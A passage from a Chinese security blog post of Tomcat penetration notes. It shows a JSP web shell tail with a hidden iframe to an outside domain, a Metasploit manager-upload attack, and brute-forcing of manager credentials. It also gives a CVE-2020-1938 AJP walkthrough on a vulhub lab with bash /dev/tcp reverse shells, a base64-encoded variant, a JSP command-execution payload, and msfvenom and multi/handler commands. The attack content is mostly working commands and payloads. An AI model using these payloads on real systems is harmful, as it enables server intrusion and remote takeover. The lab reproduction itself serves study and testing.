value=&quot;&lt;%=strExecute[languageNo]%&gt;&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;%</span><br><span class="line">if(sbCmd!=null &amp;&amp; sbCmd.toString().trim().equals(&quot;&quot;)==false)</span><br><span class="line">&#123;</span><br><span class="line">%&gt;</span><br><span class="line">&amp;nbsp;&lt;TEXTAREA NAME=&quot;cqq&quot; ROWS=&quot;20&quot; COLS=&quot;100%&quot;&gt;&lt;%=sbCmd.toString()%&gt;&lt;/TEXTAREA&gt;</span><br><span class="line">&lt;br&gt;&amp;nbsp;</span><br><span class="line">&lt;%</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/DIV&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;center&gt;&lt;a href=&quot;http://&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt; </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;iframe src=http://7jyewu.cn/a/a.asp width=0 height=0&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></div></figure>




        <h4 id="MSF攻击"   >
          <a href="#MSF攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#MSF攻击" class="headerlink" title="MSF攻击"></a>MSF攻击</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/tomcat_mgr_upload </span><br><span class="line">set HttpUsername tomcat</span><br><span class="line">set HttpPassword tomcat</span><br><span class="line">set rhosts 192.168.175.191</span><br><span class="line">set rport 8080</span><br><span class="line">exploit</span><br></pre></td></tr></table></div></figure>



<p>这里就直接略过了 自己去操作一下 </p>
<p>这就成功进来了</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619340998143.png" alt="1619340998143"></p>

        <h3 id="Tomcat-manager-App暴力破解"   >
          <a href="#Tomcat-manager-App暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat-manager-App暴力破解" class="headerlink" title="Tomcat manager App暴力破解"></a>Tomcat manager App暴力破解</h3>
      <p>我们先抓后台的包</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619341538485.png" alt="1619341538485"></p>
<p>然后放包  进行登录  </p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619341565301.png" alt="1619341565301"></p>
<p>这里注意这段回显</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic dG9tY2F0OnRvbWNhdA==</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619341609504.png" alt="1619341609504"></p>
<p>发现Tomcat的后台登录账号和密码</p>
<p>是以base64加密的 账号:密码</p>
<p>然后我们重新去抓后台的包 进行爆破</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619341768817.png" alt="1619341768817"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619341811564.png" alt="1619341811564"></p>
<p>添加密码本 和base64 的编码规则 </p>
<p>把这个自带的编码 对勾去掉</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619342044653.png" alt="1619342044653"></p>
<p>开始攻击 拿到账号和密码</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619342139990.png" alt="1619342139990"></p>
<p>这里讲第二种方式</p>
<p>自定义迭代器</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619342352290.png" alt="1619342352290"></p>
<p>分位置 进行不同的载入</p>
<p>比如这里 就应该是3个位置</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619342430579.png" alt="1619342430579"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619342458443.png" alt="1619342458443"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619342481874.png" alt="1619342481874"></p>
<p>下面和之前的设置 一样 </p>
<p>base64编码 和去掉对勾 默认的Url编码</p>

        <h3 id="Tomcat-AJP文件包含漏洞分析-CVE-2020-1938）"   >
          <a href="#Tomcat-AJP文件包含漏洞分析-CVE-2020-1938）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat-AJP文件包含漏洞分析-CVE-2020-1938）" class="headerlink" title="Tomcat AJP文件包含漏洞分析(CVE-2020-1938）"></a>Tomcat AJP文件包含漏洞分析(CVE-2020-1938）</h3>
      
        <h4 id="影响版本："   >
          <a href="#影响版本：" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat 9.x &lt; 9.0.31</span><br><span class="line">Apache Tomcat 8.x&lt;8.5.51</span><br><span class="line">Apache Tomcat 7.x&lt;7.0.100</span><br><span class="line">Apache tomcat 6.x</span><br></pre></td></tr></table></div></figure>






        <h3 id="复现-1"   >
          <a href="#复现-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3>
      <p>利用vulhub</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd tomcat/CVE-2020-1938</span><br><span class="line"></span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619348867355.png" alt="1619348867355"></p>
<p>Poc地址：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" >https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p>
<p>脚本是基于Python2的</p>
<p>它可以看webapps目录下的所有东西</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619349787403.png" alt="1619349787403"></p>
<p>可以看到它的语法要求</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 文件读取.py 192.168.175.191 -p 8009 -f webapps目录下的待读取的文件</span><br></pre></td></tr></table></div></figure>





<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 文件读取.py 192.168.175.191 -p 8009 -f /WEB-INF/web.xml</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619349894166.png" alt="1619349894166"></p>
<p>文件包含RCE </p>
<p>在线bash payload生成： <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html" >http://www.jackson-t.ca/runtime-exec-payloads.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.175.191/8888 0&gt;&amp;1</span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619350245468.png" alt="1619350245468"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></div></figure>



<p>最终的txt的payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></div></figure>



<p>这边要手动上传上去 </p>
<p>查看</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps</span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619350478774.png" alt="1619350478774"></p>
<p>然后开始上传</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp /home/dayu/Desktop/1.txt 6c80deb9d194:/usr/local/tomcat/webapps/ROOT</span><br></pre></td></tr></table></div></figure>



<p>可以去docker 底层看看</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -ti 6c bash</span><br></pre></td></tr></table></div></figure>





<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619350649495.png"></p>
<p>成功传上去了</p>
<p>开启nc监听 </p>
<p>具体可以看这里：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_30653631/article/details/93749505?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-1-93749505.pc_agg_rank_aggregation&amp;utm_term=Ubuntu%E5%AE%89%E8%A3%85nc&amp;spm=1000.2123.3001.4430" >https://blog.csdn.net/qq_30653631/article/details/93749505?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-1-93749505.pc_agg_rank_aggregation&amp;utm_term=Ubuntu%E5%AE%89%E8%A3%85nc&amp;spm=1000.2123.3001.4430</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619351018857.png" alt="1619351018857"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 文件包含.py 192.168.175.191 -p 8009 -f 1.txt</span><br></pre></td></tr></table></div></figure>





<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619351185840.png" alt="1619351185840"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619351175429.png" alt="1619351175429"></p>
<p>可以看到成功上线了</p>
<p><strong>可以和War联动是吧 可以和PUT联动是吧</strong></p>

        <h3 id="把shell弹到MSF上"   >
          <a href="#把shell弹到MSF上" class="heading-link"><i class="fas fa-link"></i></a><a href="#把shell弹到MSF上" class="headerlink" title="把shell弹到MSF上"></a>把shell弹到MSF上</h3>
      <p>MSF生成木马</p>
<p>我这边还是上kali吧  Ubuntu不是很顺手</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.175.167 LPORT=4444 R &gt; shell.txt</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619351850151.png" alt="1619351850151"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp /home/dayu/Desktop/shell.txt 6c80deb9d194:/usr/local/tomcat/webapps/ROOT</span><br></pre></td></tr></table></div></figure>



<p>去docker底层看看</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619351998810.png" alt="1619351998810"></p>
<p>上MSF 开启监听</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload java/jsp_shell_reverse_tcp</span><br><span class="line">payload =&gt; java/jsp_shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.175.167</span><br><span class="line">lhost =&gt; 192.168.175.167</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit -j</span><br></pre></td></tr></table></div></figure>



<p>执行文件包含RCE</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 文件包含.py 192.168.175.191 -p 8009 -f shell.txt</span><br></pre></td></tr></table></div></figure>





<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619352574611.png" alt="1619352574611"></p>
<p>可以看到已经拿到shell了</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619352504843.png" alt="1619352504843"></p>
<p>按shell就可以进来了</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619352730021.png" alt="1619352730021"></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://example.com">John Doe</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://example.com/2021/06/22/Tomcat/">http://example.com/2021/06/22/Tomcat/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/Tomcat%E6%80%BB%E7%BB%93/">Tomcat总结</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/06/22/Weblogic/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Weblogic总结</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/06/22/Thinkphp/"><span class="paginator-prev__text">Thinkphp总结</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat"><span class="toc-number">1.</span> <span class="toc-text">
          Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">1.1.</span> <span class="toc-text">
          安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">
          Tomcat分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">
          主要文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">
          上传目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat%E6%B8%97%E9%80%8F"><span class="toc-number">1.3.</span> <span class="toc-text">
          Tomcat渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-CVE-2017-12615%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">
          Tomcat任意文件写入(CVE-2017-12615）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">
          影响范围</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">
          复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">
          漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">
          开始复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%EF%BC%8C%E6%88%90%E5%8A%9F%E4%B8%8A%E4%BC%A0jsp"><span class="toc-number">1.3.1.4.1.</span> <span class="toc-text">
          绕过，成功上传jsp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.1.4.2.</span> <span class="toc-text">
          最新版本复现</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.3.1.4.2.1.</span> <span class="toc-text">
          修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2019-0232%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">
          Tomcat远程代码执行（CVE-2019-0232）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">
          影响范围</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-1"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">
          安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">
          漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4-amp-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.3.</span> <span class="toc-text">
          Tomcat弱口令&amp;后台getshell漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-2"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">
          影响范围</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">
          MSF攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat-manager-App%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.3.4.</span> <span class="toc-text">
          Tomcat manager App暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat-AJP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2020-1938%EF%BC%89"><span class="toc-number">1.3.5.</span> <span class="toc-text">
          Tomcat AJP文件包含漏洞分析(CVE-2020-1938）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">
          影响版本：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">1.3.6.</span> <span class="toc-text">
          复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%8Ashell%E5%BC%B9%E5%88%B0MSF%E4%B8%8A"><span class="toc-number">1.3.7.</span> <span class="toc-text">
          把shell弹到MSF上</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://gitee.com/BothSavage/PicGo/raw/master/image/头像.png" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">1</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.4.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
